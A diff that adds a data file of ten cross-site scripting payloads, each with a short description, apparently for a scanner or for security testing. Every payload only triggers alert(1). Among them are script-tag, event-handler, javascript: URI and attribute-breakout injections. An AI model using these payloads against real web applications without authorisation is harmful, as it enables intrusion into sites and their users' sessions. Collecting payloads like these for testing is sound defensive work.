@@ -1,0 +1,13 @@
+# XSS Payloads
+# Each line: payload|description
+
+<script>alert(1)</script>|Basic script tag
+<img src=x onerror=alert(1)>|Image onerror payload
+<svg onload=alert(1)>|SVG onload payload
+javascript:alert(1)|JavaScript URI
+"><script>alert(1)</script>|Breaking out of attribute
+<body onload=alert(1)>|Body onload
+<iframe src=javascript:alert(1)>|IFrame JavaScript URI
+<input onfocus=alert(1) autofocus>|Input autofocus
+<details open ontoggle=alert(1)>|Details ontoggle
+'"><img src=x onerror=alert(1)>|Combined breakout
